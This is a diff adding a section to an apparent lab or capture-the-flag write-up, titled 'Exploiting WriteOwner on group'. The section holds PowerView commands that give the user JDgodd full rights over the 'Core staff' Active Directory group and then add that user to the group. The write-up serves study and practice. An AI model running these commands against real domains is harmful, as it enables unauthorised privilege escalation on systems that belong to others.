@@ -1290,3 +1290,20 @@ type \\ZPH-SVRDC01.zsm.local\c$\users\administrator\desktop\flag.txt
 
 </details>
 
+<details>
+
+<summary>Exploiting WriteOwner on group</summary>
+
+<figure><img src="../.gitbook/assets/image (359).png" alt=""><figcaption><p>JDGODD has WriteOwner privilege over "Core staff" group</p></figcaption></figure>
+
+```
+Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred $cred -Rights All
+
+Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred
+
+net group 'CORE STAFF'
+```
+
+<figure><img src="../.gitbook/assets/image (360).png" alt=""><figcaption></figcaption></figure>
+
+</details>
